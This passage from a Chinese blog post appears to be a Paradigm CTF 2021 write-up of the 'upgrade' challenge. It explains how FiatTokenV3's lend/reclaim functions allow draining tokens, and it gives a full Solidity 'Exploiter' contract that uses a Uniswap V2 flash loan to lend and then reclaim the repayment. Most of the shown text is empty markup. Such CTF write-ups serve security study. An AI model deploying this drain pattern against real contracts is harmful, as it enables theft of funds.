pan></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<h2 id=\"Analyse-1\"><a href=\"#Analyse-1\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><details class=\"custom-details\">\n<summary>Click to see flow chart</summary>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/%E6%9C%AA%E5%91%BD%E5%90%8D.svg\"></p>\n\n</details>\n<p>看一下合约的借贷功能，很好理解</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">lend</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    _loans<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _loans<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">reclaim</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    _loans<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _loans<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatTokenV3: decreased loans below zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以指定to地址进行借出又可以直接进行还款操作（在to地址有token的情况下），借贷两个操作都集中在单方面，所以很容易出现安全问题</p>\n<p>such as：</p>\n<p>首先通过flash loan功能借出200_000_000e6的token，我们在将全部toke借给flash loan的来源合约，回调函数为空或者直接reclaim，自然就会通过flashloan的判断，之后我们就可以调用reclaim函数恰钱了！在transfer给FiatToken v3，通关！</p>\n<h2 id=\"Attack-1\"><a href=\"#Attack-1\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Exploiter</span> <span class=\"token punctuation\">&#123;</span>\n    FiatTokenV3 <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> USDC <span class=\"token operator\">=</span> <span class=\"token function\">FiatTokenV3</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    IWETH9 <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> WETH <span class=\"token operator\">=</span> <span class=\"token function\">IWETH9</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    IUniswapV2Pair <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> USDCWETH <span class=\"token operator\">=</span> <span class=\"token function\">IUniswapV2Pair</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> value <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        WETH<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> value<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        WETH<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>USDCWETH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        USDCWETH<span class=\"token punctuation\">.</span><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>IUniswapV2Pair pair<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount1<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        pair<span class=\"token punctuation\">.</span><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span>amount0<span class=\"token punctuation\">,</span> amount1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0x123456\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> paid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>amount0 <span class=\"token operator\">+</span> amount1<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">1004</span> <span class=\"token operator\">/</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n        USDC<span class=\"token punctuation\">.</span><span class=\"token function\">reclaim</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> paid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">uniswapV2Call</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> topay <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>amount0 <span class=\"token operator\">+</span> amount1<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">1004</span> <span class=\"token operator\">/</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n        USDC<span class=\"token punctuation\">.</span><span class=\"token function\">lend</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> topay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        USDC<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","feature":true,"text":"由于团队的需要，需要复现一下Paradigm CTF 2021。 1.ReverCodepragma solidity 0.8.0; contract Deployer &#123; constructor(bytes memory code) &#123; assembly &...","link":"","photos":[],"count_time":{"symbolsCount":"88k","symbolsTime":"1:20"},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":20,"path":"api/tags/区块链.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#1-Rever\"><span class=\"toc-text\">1.Rever</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2-upgrade\"><span class=\"toc-text\">2.upgrade</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-1\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-1\"><span class=\"toc-text\">Attack</span></a></li></ol></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Priority Gas Auctions (PGAs)","uid":"ac4aeeb950031db089d1689b68bf4df9","slug":"Priority-Gas-Auctions-(PGAs)","date":"2023-01-03T16:27:44.588Z","updated":"2023-04-25T12:22:40.288Z","comments":true,"path":"api/articles/Priority-Gas-Auctions-(PGAs).json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/20201017172017.png","text":"0x01 前提我们都知道，常规意义上，在以太坊上提交交易是一个有序的过程，现在重新审视一下这个过程： 用户需要在钱包构建交易，并签名，钱包后端会将该交易广播到 P2P 网络； 该交易首先会进入各个节点的 mempool，按照一定的顺序排列； 矿工从 mempool 中选取合适的交...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"区块链 ctf","slug":"区块链-ctf","count":13,"path":"api/tags/区块链-ctf.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Down Under CTF","uid":"37d952c359458cb6532fc36cd0258d93","slug":"DownUnder","date":"2022-10-11T15:34:16.219Z","updated":"2022-12-16T06:59:31.988Z","comments":true,"path":"api/articles/DownUnder.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/f67bba9809a0d5a0a679952624d88928527fc48cfe7fcd381ab21a60cb838f3f.png","text":"DownUnder ctf 2022-blockchain题解 Solve Me一道签到题，没什么难度，调用指定函数即可 function solveChallenge() external &#123; isSolved = true; &#125; Secret and Ep...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"12 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":20,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}